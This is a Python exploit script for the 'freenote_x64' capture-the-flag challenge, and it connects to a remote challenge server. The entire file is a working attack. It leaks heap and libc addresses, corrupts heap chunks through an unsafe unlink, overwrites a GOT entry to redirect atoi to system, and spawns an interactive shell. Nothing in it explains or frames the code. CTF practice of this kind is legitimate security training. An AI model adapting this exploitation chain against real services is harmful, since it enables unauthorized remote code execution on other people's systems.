from zio import *

target = "./freenote_x64"
target = ("pwn2.jarvisoj.com", 9886)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return io

def list_note(io):
	io.read_until(": ")
	io.writeline("1")

def new_note(io, length, content):
	io.read_until(": ")
	io.writeline("2")
	io.read_until(": ")
	io.writeline(str(length))
	io.read_until(": ")
	io.write(content)

def edit_note(io, index, length, content):
	io.read_until(": ")
	io.writeline("3")
	io.read_until(": ")
	io.writeline(str(index))
	io.read_until(": ")
	io.writeline(str(length))
	io.read_until(": ")
	io.write(content)

def delete_note(io, index):
	io.read_until(": ")
	io.writeline("4")
	io.read_until(": ")
	io.writeline(str(index))

def pwn(io):
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)
	new_note(io, 0x80, 'a'*0x80)

	delete_note(io, 1)
	delete_note(io, 3)
	edit_note(io, 0, 0x98, "a"*0x98)
	list_note(io)

	io.read_until("a"*0x98)
	data = io.read_until("\n")[:-1]
	print [c for c in data]

	heap_addr = l64(data[:8].ljust(8, "\x00"))
	manager_addr = heap_addr-0x19d0 + 0x10
	print "heap_addr:", hex(heap_addr)
	print "manager_addr:", hex(manager_addr)

	node0_addr = manager_addr + 0x10 + 0x18 * 0 + 0x10
	
	#usefull code begin
	bits = 64#32
	if bits == 32:
		p_func = l32
		field_size = 4
	else:
		p_func = l64
		field_size = 8

	p0 = p_func(0x0)
	p1 = p_func(0x81)
	p2 = p_func(node0_addr - 3 * field_size)
	p3 = p_func(node0_addr - 2 * field_size)
	node1_pre_size = p_func(0x80)
	node1_size = p_func(0x80 + 2 * field_size)
	data0 = p0 + p1 + p2 + p3 + "".ljust(0x80 - 4 * field_size, '1') + node1_pre_size + node1_size
	
	#edit node 0, over write node 1
	edit_note(io, 0, len(data0), data0)

	#delete node 1 unlink node 0 
	delete_note(io, 1)
	#usefull code end

	atoi_got                   = 0x0000000000602070  
	offset_atoi                = 0x383a0             
	atoi_plt                   = 0x0000000000400760

	offset_system = 0x44c40

	#remote
	offset_atoi                = 0x39ea0             
	#atoi_plt                   = 0x0000000000400760  
	offset_system = 0x46590

	payload = ""
	payload += l64(0x02)
	payload += l64(0x01)
	payload += l64(0x8)
	payload += l64(atoi_got)

	payload = payload.ljust(0x90, 'a')

	edit_note(io, 0, len(payload), payload)
	list_note(io)

	io.read_until("0. ")
	data = io.read_until("\n")[:-1]

	atoi_addr = l64(data[:8].ljust(8, '\x00'))
	print "atoi_addr:", hex(atoi_addr)

	libc_base = atoi_addr - offset_atoi
	system_addr = libc_base + offset_system
	print "system_addr:", hex(system_addr)

	payload = ""
	payload += l64(system_addr)
	edit_note(io, 0, len(payload), payload)

	io.read_until(":")
	io.writeline("/bin/sh;")

	io.interact()

io = get_io(target)
pwn(io)

